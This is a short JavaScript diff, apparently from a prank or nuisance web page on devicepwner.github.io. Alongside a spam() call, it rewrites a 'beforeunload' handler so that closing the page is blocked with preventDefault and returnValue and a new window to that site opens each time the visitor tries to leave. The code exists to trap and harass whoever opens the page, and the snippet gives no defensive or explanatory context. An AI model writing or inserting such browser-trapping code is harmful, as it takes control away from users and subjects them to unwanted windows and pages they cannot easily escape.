@@ -10,8 +10,9 @@
         spam()
       });
       window.addEventListener('beforeunload', 
-      () => { 
-        return window.open('https://devicepwner.github.io/device/hide', '_blank').focus()
+      (e) => { 
+        e.preventDefault()
+        return e.returnValue = window.open('https://devicepwner.github.io/device', '_blank').focus()
       });
     function randomString(length) {
         let result = '';
